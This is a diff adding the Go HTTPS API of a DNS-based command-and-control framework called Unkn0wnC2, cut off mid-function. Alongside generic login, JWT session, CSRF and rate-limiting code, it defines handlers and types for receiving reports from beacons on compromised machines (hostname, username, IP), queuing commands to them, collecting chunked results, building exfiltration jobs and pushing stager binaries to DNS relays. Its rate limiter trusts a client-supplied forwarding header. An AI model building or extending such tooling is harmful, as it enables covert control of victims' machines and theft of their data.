@@ -1,0 +1,3607 @@
+// Package main implements the HTTPS API for the Unkn0wnC2 Master Server.
+// This provides RESTful endpoints for operator management, DNS server coordination,
+// and beacon/task orchestration across distributed DNS C2 servers.
+package main
+
+import (
+	"bytes"
+	"compress/gzip"
+	"crypto/sha256"
+	"crypto/subtle"
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"sort"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/golang-jwt/jwt/v5"
+	"github.com/gorilla/mux"
+)
+
+// APIServer wraps the HTTP server and provides API functionality
+type APIServer struct {
+	db             *MasterDatabase
+	config         Config
+	jwtSecret      []byte
+	authLimiter    *RateLimiter // Rate limiter for auth endpoints
+	apiLimiter     *RateLimiter // Rate limiter for API endpoints
+	dnsLimiter     *RateLimiter // Rate limiter for DNS server endpoints
+	exfilJobsMu              sync.RWMutex
+	exfilBuildJobs           map[string]*ExfilBuildJob
+	dnsServerDomainCache     map[string]string // key: server ID, value: domain
+	dnsServerDomainCacheMu   sync.RWMutex
+	dnsServerDomainCacheTime time.Time
+}
+
+// NewAPIServer creates a new API server instance
+func NewAPIServer(db *MasterDatabase, config Config) *APIServer {
+	return &APIServer{
+		db:             db,
+		config:         config,
+		jwtSecret:      []byte(config.JWTSecret),
+		authLimiter:    NewRateLimiter(5, time.Minute),    // 5 login attempts per minute
+		apiLimiter:     NewRateLimiter(100, time.Minute),  // 100 API requests per minute
+		dnsLimiter:     NewRateLimiter(1000, time.Minute), // 1000 DNS server API calls per minute
+		exfilBuildJobs:       make(map[string]*ExfilBuildJob),
+		dnsServerDomainCache: make(map[string]string),
+	}
+}
+
+// Claims represents JWT token claims
+type Claims struct {
+	OperatorID string `json:"operator_id"`
+	Username   string `json:"username"`
+	Role       string `json:"role"`
+	JTI        string `json:"jti"` // JWT ID for token revocation
+	jwt.RegisteredClaims
+}
+
+// RateLimiter implements a token bucket rate limiter per IP address
+type RateLimiter struct {
+	visitors map[string]*Visitor
+	mu       sync.RWMutex
+	rate     int           // requests per window
+	window   time.Duration // time window
+}
+
+// Visitor tracks rate limit state for a single IP
+type Visitor struct {
+	tokens     int
+	lastUpdate time.Time
+	mu         sync.Mutex
+}
+
+// NewRateLimiter creates a new rate limiter
+// rate: maximum requests per window
+// window: time window duration (e.g., 1 minute)
+func NewRateLimiter(rate int, window time.Duration) *RateLimiter {
+	rl := &RateLimiter{
+		visitors: make(map[string]*Visitor),
+		rate:     rate,
+		window:   window,
+	}
+
+	// Cleanup old visitors every 5 minutes
+	go func() {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			rl.cleanup()
+		}
+	}()
+
+	return rl
+}
+
+// getVisitor returns the visitor for an IP, creating if needed
+func (rl *RateLimiter) getVisitor(ip string) *Visitor {
+	rl.mu.Lock()
+	defer rl.mu.Unlock()
+
+	visitor, exists := rl.visitors[ip]
+	if !exists {
+		visitor = &Visitor{
+			tokens:     rl.rate,
+			lastUpdate: time.Now(),
+		}
+		rl.visitors[ip] = visitor
+	}
+
+	return visitor
+}
+
+// Allow checks if a request from the IP should be allowed
+func (rl *RateLimiter) Allow(ip string) bool {
+	visitor := rl.getVisitor(ip)
+	visitor.mu.Lock()
+	defer visitor.mu.Unlock()
+
+	now := time.Now()
+	elapsed := now.Sub(visitor.lastUpdate)
+
+	// Refill tokens based on elapsed time
+	if elapsed >= rl.window {
+		visitor.tokens = rl.rate
+		visitor.lastUpdate = now
+	}
+
+	if visitor.tokens > 0 {
+		visitor.tokens--
+		return true
+	}
+
+	return false
+}
+
+// cleanup removes old visitors to prevent memory leak
+func (rl *RateLimiter) cleanup() {
+	rl.mu.Lock()
+	defer rl.mu.Unlock()
+
+	cutoff := time.Now().Add(-10 * time.Minute)
+	toDelete := []string{}
+
+	// First pass: identify visitors to delete (without holding individual locks)
+	for ip, visitor := range rl.visitors {
+		visitor.mu.Lock()
+		if visitor.lastUpdate.Before(cutoff) {
+			toDelete = append(toDelete, ip)
+		}
+		visitor.mu.Unlock()
+	}
+
+	// Second pass: delete identified visitors
+	for _, ip := range toDelete {
+		delete(rl.visitors, ip)
+	}
+}
+
+// Response structures
+
+type ErrorResponse struct {
+	Error   string `json:"error"`
+	Message string `json:"message,omitempty"`
+}
+
+type SuccessResponse struct {
+	Success bool        `json:"success"`
+	Message string      `json:"message,omitempty"`
+	Data    interface{} `json:"data,omitempty"`
+}
+
+type LoginRequest struct {
+	Username string `json:"username"`
+	Password string `json:"password"`
+}
+
+type LoginResponse struct {
+	Token     string    `json:"token"`
+	ExpiresAt time.Time `json:"expires_at"`
+	Operator  struct {
+		ID       string `json:"id"`
+		Username string `json:"username"`
+		Role     string `json:"role"`
+	} `json:"operator"`
+}
+
+type DNSServerCheckinRequest struct {
+	DNSServerID string                 `json:"dns_server_id"`
+	APIKey      string                 `json:"api_key"`
+	Status      string                 `json:"status"`
+	Stats       map[string]interface{} `json:"stats"`
+}
+
+type BeaconReportRequest struct {
+	DNSServerID string `json:"dns_server_id"`
+	APIKey      string `json:"api_key"`
+	Beacon      struct {
+		ID                string    `json:"id"`
+		Hostname          string    `json:"hostname"`
+		Username          string    `json:"username"`
+		OS                string    `json:"os"`
+		Arch              string    `json:"arch"`
+		IPAddress         string    `json:"ip_address"`
+		FirstSeen         time.Time `json:"first_seen"`
+		LastSeen          time.Time `json:"last_seen"`
+		BeaconName        string    `json:"beacon_name,omitempty"`
+		PayloadFormat     string    `json:"payload_format,omitempty"`
+		Encoding          string    `json:"encoding,omitempty"`
+		RegistrationStage *int      `json:"registration_stage,omitempty"`
+	} `json:"beacon"`
+}
+
+type TaskCreateRequest struct {
+	BeaconID string `json:"beacon_id"`
+	Command  string `json:"command"`
+}
+
+type ResultSubmitRequest struct {
+	DNSServerID string `json:"dns_server_id"`
+	APIKey      string `json:"api_key"`
+	TaskID      string `json:"task_id"`
+	BeaconID    string `json:"beacon_id"`
+	ChunkIndex  int    `json:"chunk_index"`
+	TotalChunks int    `json:"total_chunks"`
+	Data        string `json:"data"`
+}
+
+type TaskProgressRequest struct {
+	DNSServerID    string `json:"dns_server_id"`
+	APIKey         string `json:"api_key"`
+	TaskID         string `json:"task_id"`
+	BeaconID       string `json:"beacon_id"`
+	ReceivedChunks int    `json:"received_chunks"`
+	TotalChunks    int    `json:"total_chunks"`
+	Status         string `json:"status"` // "receiving", "assembling", "complete"
+}
+
+// Middleware
+
+// loggingMiddleware logs all API requests
+func (api *APIServer) loggingMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		start := time.Now()
+
+		// Call the next handler
+		next.ServeHTTP(w, r)
+
+		// Log request
+		if api.config.Debug {
+			fmt.Printf("[API] %s %s - %s - %v\n",
+				r.Method,
+				r.RequestURI,
+				r.RemoteAddr,
+				time.Since(start))
+		}
+	})
+}
+
+// rateLimitMiddleware provides rate limiting based on IP address
+func (api *APIServer) rateLimitMiddleware(limiter *RateLimiter) func(http.Handler) http.Handler {
+	return func(next http.Handler) http.Handler {
+		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			// Extract IP address
+			ip := r.RemoteAddr
+			if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
+				// Use first IP in X-Forwarded-For chain
+				ip = strings.Split(forwarded, ",")[0]
+				ip = strings.TrimSpace(ip)
+			} else if realIP := r.Header.Get("X-Real-IP"); realIP != "" {
+				ip = realIP
+			}
+
+			// Strip port if present
+			if host, _, err := net.SplitHostPort(ip); err == nil {
+				ip = host
+			}
+
+			// Check rate limit
+			if !limiter.Allow(ip) {
+				w.Header().Set("Content-Type", "application/json")
+				w.Header().Set("Retry-After", "60") // Suggest retry after 60 seconds
+				w.WriteHeader(http.StatusTooManyRequests)
+				json.NewEncoder(w).Encode(ErrorResponse{
+					Error:   "rate_limit_exceeded",
+					Message: "Too many requests. Please try again later.",
+				})
+				return
+			}
+
+			next.ServeHTTP(w, r)
+		})
+	}
+}
+
+// csrfMiddleware validates CSRF tokens for state-changing requests (POST/PUT/DELETE/PATCH)
+// This protects against Cross-Site Request Forgery attacks
+func (api *APIServer) csrfMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Only check CSRF for state-changing methods
+		if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" || r.Method == "PATCH" {
+			// Skip CSRF check if using API authentication (Authorization header)
+			// CSRF is primarily a browser concern
+			if r.Header.Get("Authorization") != "" {
+				next.ServeHTTP(w, r)
+				return
+			}
+
+			// Get CSRF token from cookie
+			csrfCookie, err := r.Cookie("csrf_token")
+			if err != nil {
+				api.sendError(w, http.StatusForbidden, "missing CSRF token")
+				return
+			}
+
+			// Get CSRF token from request header
+			csrfHeader := r.Header.Get("X-CSRF-Token")
+			if csrfHeader == "" {
+				api.sendError(w, http.StatusForbidden, "missing CSRF token in header")
+				return
+			}
+
+			if subtle.ConstantTimeCompare([]byte(csrfCookie.Value), []byte(csrfHeader)) != 1 {
+				api.sendError(w, http.StatusForbidden, "invalid CSRF token")
+				return
+			}
+		}
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+// authMiddleware validates JWT tokens for operator endpoints
+func (api *APIServer) authMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var tokenString string
+
+		// Try to get token from cookie first (web UI)
+		if cookie, err := r.Cookie("session_token"); err == nil {
+			tokenString = cookie.Value
+		} else {
+			// Fallback to Authorization header (API clients, backward compatibility)
+			authHeader := r.Header.Get("Authorization")
+			if authHeader == "" {
+				api.sendError(w, http.StatusUnauthorized, "missing authorization")
+				return
+			}
+
+			// Check for Bearer token
+			parts := strings.Split(authHeader, " ")
+			if len(parts) != 2 || parts[0] != "Bearer" {
+				api.sendError(w, http.StatusUnauthorized, "invalid authorization format")
+				return
+			}
+
+			tokenString = parts[1]
+		}
+
+		if tokenString == "" {
+			api.sendError(w, http.StatusUnauthorized, "missing token")
+			return
+		}
+
+		// Parse and validate token
+		claims := &Claims{}
+		token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
+			// Validate signing method
+			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
+			}
+			return api.jwtSecret, nil
+		})
+
+		if err != nil || !token.Valid {
+			api.sendError(w, http.StatusUnauthorized, "invalid token")
+			return
+		}
+
+		// Check if the session is revoked (JWT revocation via JTI)
+		if claims.JTI != "" {
+			isRevoked, err := api.db.IsSessionRevoked(claims.JTI)
+			if err != nil {
+				api.sendError(w, http.StatusInternalServerError, "failed to check session status")
+				return
+			}
+			if isRevoked {
+				api.sendError(w, http.StatusUnauthorized, "session has been revoked")
+				return
+			}
+		}
+
+		// Add claims to request context for handlers to use
+		r = r.WithContext(r.Context())
+		r.Header.Set("X-Operator-ID", claims.OperatorID)
+		r.Header.Set("X-Operator-Username", claims.Username)
+		r.Header.Set("X-Operator-Role", claims.Role)
+		r.Header.Set("X-JWT-ID", claims.JTI) // Add JTI for logout handler
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+// dnsServerAuthMiddleware validates DNS server API keys
+func (api *APIServer) dnsServerAuthMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Extract DNS server ID and API key from request
+		var dnsServerID, apiKey string
+
+		// Try to get from JSON body (read and restore)
+		if r.Method == http.MethodPost || r.Method == http.MethodPut {
+			// Read the body
+			bodyBytes, err := io.ReadAll(r.Body)
+			if err != nil {
+				api.sendError(w, http.StatusBadRequest, "failed to read request body")
+				return
+			}
+			r.Body.Close()
+
+			// Parse to get auth info
+			var authData struct {
+				DNSServerID string `json:"dns_server_id"` // Used by most endpoints
+				ServerID    string `json:"server_id"`     // Used by registration endpoint
+				APIKey      string `json:"api_key"`
+			}
+			if err := json.Unmarshal(bodyBytes, &authData); err != nil {
+				api.sendError(w, http.StatusBadRequest, "invalid request body")
+				return
+			}
+
+			// Support both dns_server_id and server_id (for registration)
+			dnsServerID = authData.DNSServerID
+			if dnsServerID == "" {
+				dnsServerID = authData.ServerID
+			}
+			apiKey = authData.APIKey
+
+			// Restore the body for the handler to read
+			r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
+		} else {
+			// Try query parameters for GET requests
+			dnsServerID = r.URL.Query().Get("dns_server_id")
+			apiKey = r.URL.Query().Get("api_key")
+		}
+
+		// Special handling for registration endpoint - allow with missing or unverified credentials
+		if strings.HasSuffix(r.URL.Path, "/register") {
+			// Store the extracted IDs for handler use (even if empty, handler will validate)
+			r.Header.Set("X-DNS-Server-ID", dnsServerID)
+			r.Header.Set("X-DNS-Server-APIKey", apiKey)
+			next.ServeHTTP(w, r)
+			return
+		}
+
+		if dnsServerID == "" || apiKey == "" {
+			api.sendError(w, http.StatusUnauthorized, "missing dns_server_id or api_key")
+			return
+		}
+
+		// Verify API key
+		valid, err := api.db.VerifyDNSServerAPIKey(dnsServerID, apiKey)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, "authentication error")
+			return
+		}
+
+		if !valid {
+			api.sendError(w, http.StatusUnauthorized, "invalid credentials")
+			return
+		}
+
+		// Store DNS server ID in header for handler
+		r.Header.Set("X-DNS-Server-ID", dnsServerID)
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+// Helper methods
+
+func (api *APIServer) sendError(w http.ResponseWriter, status int, message string) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(status)
+	json.NewEncoder(w).Encode(ErrorResponse{
+		Error:   http.StatusText(status),
+		Message: message,
+	})
+}
+
+func (api *APIServer) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(SuccessResponse{
+		Success: true,
+		Message: message,
+		Data:    data,
+	})
+}
+
+func (api *APIServer) sendJSON(w http.ResponseWriter, data interface{}) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(data)
+}
+
+// Authentication Endpoints
+
+// handleLogin authenticates an operator and returns a JWT token
+func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
+	var req LoginRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		fmt.Printf("[API] Failed to decode login request: %v\n", err)
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	fmt.Printf("[API] Login attempt for user: %s\n", req.Username)
+
+	// Verify credentials
+	operatorID, role, err := api.db.VerifyOperatorCredentials(req.Username, req.Password)
+	if err != nil {
+		fmt.Printf("[API] Credential verification failed: %v\n", err)
+		api.sendError(w, http.StatusUnauthorized, "invalid credentials")
+
+		// Log failed login attempt
+		api.db.LogAuditEvent("", "login_failed", "operator", req.Username,
+			fmt.Sprintf("Failed login attempt for username: %s", req.Username),
+			r.RemoteAddr)
+		return
+	}
+
+	fmt.Printf("[API] Credentials verified for user: %s (ID: %s)\n", req.Username, operatorID)
+
+	// Generate JWT token with unique JTI (JWT ID) for revocation support
+	jti := generateID()
+	expiresAt := time.Now().Add(time.Duration(api.config.SessionTimeout) * time.Minute)
+	claims := &Claims{
+		OperatorID: operatorID,
+		Username:   req.Username,
+		Role:       role,
+		JTI:        jti,
+		RegisteredClaims: jwt.RegisteredClaims{
+			ExpiresAt: jwt.NewNumericDate(expiresAt),
+			IssuedAt:  jwt.NewNumericDate(time.Now()),
+			Issuer:    "unkn0wnc2-master",
+		},
+	}
+
+	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+	tokenString, err := token.SignedString(api.jwtSecret)
+	if err != nil {
+		fmt.Printf("[API] Failed to sign JWT token: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, "failed to generate token")
+		return
+	}
+
+	fmt.Printf("[API] JWT token generated for user: %s\n", req.Username)
+
+	// Create session record in database for revocation support
+	// Note: Use SHA256 for token hash (not bcrypt) since JWT tokens exceed bcrypt's 72-byte limit
+	sessionID := generateID()
+	tokenHash := sha256Hash(tokenString)
+	err = api.db.CreateSession(sessionID, operatorID, jti, tokenHash, r.RemoteAddr, r.UserAgent(), expiresAt.Unix())
+	if err != nil {
+		fmt.Printf("[API] Failed to create session: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, "failed to create session")
+		return
+	}
+
+	fmt.Printf("[API] Session created successfully for user: %s\n", req.Username)
+
+	// Log successful login
+	api.db.LogAuditEvent(operatorID, "login_success", "operator", operatorID,
+		fmt.Sprintf("Successful login for %s", req.Username), r.RemoteAddr)
+
+	// Set JWT as httpOnly secure cookie for better security (XSS protection)
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_token",
+		Value:    tokenString,
+		Path:     "/",
+		HttpOnly: true,                    // Prevent JavaScript access (XSS protection)
+		Secure:   true,                    // HTTPS only
+		SameSite: http.SameSiteStrictMode, // CSRF protection
+		Expires:  expiresAt,
+	})
+
+	// Generate CSRF token for additional protection
+	csrfToken := generateID()
+	http.SetCookie(w, &http.Cookie{
+		Name:     "csrf_token",
+		Value:    csrfToken,
+		Path:     "/",
+		HttpOnly: false, // JavaScript needs to read this
+		Secure:   true,
+		SameSite: http.SameSiteStrictMode,
+		Expires:  expiresAt,
+	})
+
+	// Return success response (no token in JSON for security)
+	response := LoginResponse{
+		Token:     "", // No longer return token in response body
+		ExpiresAt: expiresAt,
+	}
+	response.Operator.ID = operatorID
+	response.Operator.Username = req.Username
+	response.Operator.Role = role
+
+	api.sendJSON(w, response)
+}
+
+// handleLogout invalidates the operator's session
+func (api *APIServer) handleLogout(w http.ResponseWriter, r *http.Request) {
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+	jti := r.Header.Get("X-JWT-ID")
+
+	// Revoke the session by JTI
+	if jti != "" {
+		if err := api.db.RevokeSessionByJTI(jti); err != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to revoke session")
+			return
+		}
+	}
+
+	// Clear cookies
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_token",
+		Value:    "",
+		Path:     "/",
+		HttpOnly: true,
+		Secure:   true,
+		MaxAge:   -1, // Delete cookie immediately
+	})
+	http.SetCookie(w, &http.Cookie{
+		Name:     "csrf_token",
+		Value:    "",
+		Path:     "/",
+		HttpOnly: false,
+		Secure:   true,
+		MaxAge:   -1, // Delete cookie immediately
+	})
+
+	// Log logout
+	api.db.LogAuditEvent(operatorID, "logout", "operator", operatorID,
+		fmt.Sprintf("Logout for %s", username), r.RemoteAddr)
+
+	api.sendSuccess(w, "logged out successfully", nil)
+}
+
+// handleCurrentUser returns the current authenticated user's information
+func (api *APIServer) handleCurrentUser(w http.ResponseWriter, r *http.Request) {
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+	role := r.Header.Get("X-Operator-Role")
+
+	if operatorID == "" {
+		api.sendError(w, http.StatusUnauthorized, "no authenticated user")
+		return
+	}
+
+	// Return current user info
+	userData := map[string]interface{}{
+		"id":       operatorID,
+		"username": username,
+		"role":     role,
+	}
+
+	api.sendSuccess(w, "current user retrieved", userData)
+}
+
+// User Management Endpoints
+
+// handleListOperators returns all operator accounts
+func (api *APIServer) handleListOperators(w http.ResponseWriter, r *http.Request) {
+	operators, err := api.db.GetAllOperators()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve operators")
+		return
+	}
+
+	api.sendSuccess(w, "operators retrieved", operators)
+}
+
+// handleGetOperator retrieves a single operator
+func (api *APIServer) handleGetOperator(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	operatorID := vars["id"]
+
+	operator, err := api.db.GetOperator(operatorID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, "operator not found")
+		return
+	}
+
+	api.sendSuccess(w, "operator retrieved", operator)
+}
+
+// handleCreateOperator creates a new operator account
+func (api *APIServer) handleCreateOperator(w http.ResponseWriter, r *http.Request) {
+	// Only admins can create operators
+	role := r.Header.Get("X-Operator-Role")
+	if role != "admin" {
+		api.sendError(w, http.StatusForbidden, "insufficient permissions")
+		return
+	}
+
+	var req struct {
+		Username string `json:"username"`
+		Password string `json:"password"`
+		Role     string `json:"role"`
+		Email    string `json:"email"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Validate required fields
+	if req.Username == "" || req.Password == "" || req.Role == "" {
+		api.sendError(w, http.StatusBadRequest, "username, password, and role are required")
+		return
+	}
+
+	// Validate role
+	if req.Role != "admin" && req.Role != "operator" && req.Role != "viewer" {
+		api.sendError(w, http.StatusBadRequest, "invalid role (must be admin, operator, or viewer)")
+		return
+	}
+
+	// Check if username already exists
+	exists, err := api.db.CheckUsernameExists(req.Username)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to check username")
+		return
+	}
+	if exists {
+		api.sendError(w, http.StatusConflict, "username already exists")
+		return
+	}
+
+	// Generate operator ID
+	operatorID := generateID()
+
+	// Create operator
+	if err := api.db.CreateOperator(operatorID, req.Username, req.Password, req.Role, req.Email); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to create operator")
+		return
+	}
+
+	// Log audit event
+	currentOperatorID := r.Header.Get("X-Operator-ID")
+	api.db.LogAuditEvent(currentOperatorID, "operator_created", "operator", operatorID,
+		fmt.Sprintf("Created operator: %s (role: %s)", req.Username, req.Role), r.RemoteAddr)
+
+	api.sendSuccess(w, "operator created successfully", map[string]string{"id": operatorID})
+}
+
+// handleUpdateOperator updates operator details
+func (api *APIServer) handleUpdateOperator(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	operatorID := vars["id"]
+
+	// Check permissions
+	currentOperatorID := r.Header.Get("X-Operator-ID")
+	currentRole := r.Header.Get("X-Operator-Role")
+
+	// Operators can only update themselves, admins can update anyone
+	if currentRole != "admin" && currentOperatorID != operatorID {
+		api.sendError(w, http.StatusForbidden, "insufficient permissions")
+		return
+	}
+
+	var req struct {
+		Username string `json:"username"`
+		Role     string `json:"role"`
+		Email    string `json:"email"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Validate role if provided
+	if req.Role != "" && req.Role != "admin" && req.Role != "operator" && req.Role != "viewer" {
+		api.sendError(w, http.StatusBadRequest, "invalid role")
+		return
+	}
+
+	// Non-admins cannot change role
+	if currentRole != "admin" && req.Role != "" {
+		api.sendError(w, http.StatusForbidden, "cannot change your own role")
+		return
+	}
+
+	// Update operator
+	if err := api.db.UpdateOperator(operatorID, req.Username, req.Role, req.Email); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update operator")
+		return
+	}
+
+	// Log audit event
+	api.db.LogAuditEvent(currentOperatorID, "operator_updated", "operator", operatorID,
+		fmt.Sprintf("Updated operator: %s", req.Username), r.RemoteAddr)
+
+	api.sendSuccess(w, "operator updated successfully", nil)
+}
+
+// handleChangePassword changes an operator's password
+func (api *APIServer) handleChangePassword(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	operatorID := vars["id"]
+
+	// Check permissions
+	currentOperatorID := r.Header.Get("X-Operator-ID")
+	currentRole := r.Header.Get("X-Operator-Role")
+
+	// Operators can only change their own password, admins can change anyone's
+	if currentRole != "admin" && currentOperatorID != operatorID {
+		api.sendError(w, http.StatusForbidden, "insufficient permissions")
+		return
+	}
+
+	var req struct {
+		CurrentPassword string `json:"current_password"`
+		NewPassword     string `json:"new_password"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.NewPassword == "" {
+		api.sendError(w, http.StatusBadRequest, "new password is required")
+		return
+	}
+
+	// If not admin, verify current password
+	if currentRole != "admin" {
+		// Get current operator's username
+		operator, err := api.db.GetOperator(currentOperatorID)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to verify credentials")
+			return
+		}
+
+		// Verify current password
+		_, _, err = api.db.VerifyOperatorCredentials(operator["username"].(string), req.CurrentPassword)
+		if err != nil {
+			api.sendError(w, http.StatusUnauthorized, "current password is incorrect")
+			return
+		}
+	}
+
+	// Update password
+	if err := api.db.UpdateOperatorPassword(operatorID, req.NewPassword); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update password")
+		return
+	}
+
+	// Log audit event
+	api.db.LogAuditEvent(currentOperatorID, "password_changed", "operator", operatorID,
+		"Password changed", r.RemoteAddr)
+
+	api.sendSuccess(w, "password changed successfully", nil)
+}
+
+// handleDeleteOperator deletes an operator account
+func (api *APIServer) handleDeleteOperator(w http.ResponseWriter, r *http.Request) {
+	// Only admins can delete operators
+	role := r.Header.Get("X-Operator-Role")
+	if role != "admin" {
+		api.sendError(w, http.StatusForbidden, "insufficient permissions")
+		return
+	}
+
+	vars := mux.Vars(r)
+	operatorID := vars["id"]
+
+	// Prevent deleting yourself
+	currentOperatorID := r.Header.Get("X-Operator-ID")
+	if currentOperatorID == operatorID {
+		api.sendError(w, http.StatusBadRequest, "cannot delete your own account")
+		return
+	}
+
+	// Get operator info for audit log
+	operator, err := api.db.GetOperator(operatorID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, "operator not found")
+		return
+	}
+
+	// Delete operator
+	if err := api.db.DeleteOperator(operatorID); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to delete operator")
+		return
+	}
+
+	// Log audit event
+	api.db.LogAuditEvent(currentOperatorID, "operator_deleted", "operator", operatorID,
+		fmt.Sprintf("Deleted operator: %s", operator["username"]), r.RemoteAddr)
+
+	api.sendSuccess(w, "operator deleted successfully", nil)
+}
+
+// handleToggleOperatorStatus enables/disables an operator account
+func (api *APIServer) handleToggleOperatorStatus(w http.ResponseWriter, r *http.Request) {
+	// Only admins can toggle operator status
+	role := r.Header.Get("X-Operator-Role")
+	if role != "admin" {
+		api.sendError(w, http.StatusForbidden, "insufficient permissions")
+		return
+	}
+
+	vars := mux.Vars(r)
+	operatorID := vars["id"]
+
+	// Prevent disabling yourself
+	currentOperatorID := r.Header.Get("X-Operator-ID")
+	if currentOperatorID == operatorID {
+		api.sendError(w, http.StatusBadRequest, "cannot disable your own account")
+		return
+	}
+
+	var req struct {
+		Active bool `json:"active"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Get operator info
+	operator, err := api.db.GetOperator(operatorID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, "operator not found")
+		return
+	}
+
+	// Update status
+	if err := api.db.SetOperatorActive(operatorID, req.Active); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update operator status")
+		return
+	}
+
+	// Log audit event
+	status := "disabled"
+	if req.Active {
+		status = "enabled"
+	}
+	api.db.LogAuditEvent(currentOperatorID, "operator_status_changed", "operator", operatorID,
+		fmt.Sprintf("%s operator: %s", status, operator["username"]), r.RemoteAddr)
+
+	api.sendSuccess(w, fmt.Sprintf("operator %s successfully", status), nil)
+}
+
+// DNS Server Management Endpoints
+
+// handleListDNSServers returns all registered DNS servers
+func (api *APIServer) handleListDNSServers(w http.ResponseWriter, r *http.Request) {
+	servers, err := api.db.GetDNSServers()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
+		return
+	}
+
+	api.sendJSON(w, map[string]interface{}{
+		"servers": servers,
+	})
+}
+
+// handleDNSServerCheckin processes check-in from a DNS server
+func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Request) {
+	var req DNSServerCheckinRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Update check-in time and detect if this is first checkin
+	isFirstCheckin, err := api.db.UpdateDNSServerCheckin(dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update check-in")
+		return
+	}
+
+	// Get pending stager cache tasks for this DNS server
+	pendingCaches, err := api.db.GetPendingStagerCaches(dnsServerID)
+	if err != nil {
+		fmt.Printf("[API] Warning: Failed to get pending caches for %s: %v\n", dnsServerID, err)
+		pendingCaches = []map[string]interface{}{} // Continue with empty list
+	}
+
+	// Build response with cache tasks
+	cacheTasks := make([]map[string]interface{}, 0)
+	var cacheIDs []int
+
+	for _, cache := range pendingCaches {
+		cacheTasks = append(cacheTasks, map[string]interface{}{
+			"client_binary_id": cache["client_binary_id"],
+			"total_chunks":     cache["total_chunks"],
+			"chunks":           cache["chunks"],
+		})
+		cacheIDs = append(cacheIDs, cache["id"].(int))
+	}
+
+	// Mark caches as delivered
+	if len(cacheIDs) > 0 {
+		if err := api.db.MarkStagerCacheDelivered(cacheIDs); err != nil {
+			fmt.Printf("[API] Warning: Failed to mark caches as delivered: %v\n", err)
+		} else {
+			fmt.Printf("[API] Sent %d cache task(s) to DNS server %s\n", len(cacheIDs), dnsServerID)
+		}
+	}
+
+	// Domain updates are now managed per-beacon via the operator dashboard.
+	// New DNS server domains are NOT auto-pushed to existing beacons.
+	// Operators add domains to specific beacons via GET/PUT/POST /api/beacons/{id}/domains.
+	if isFirstCheckin {
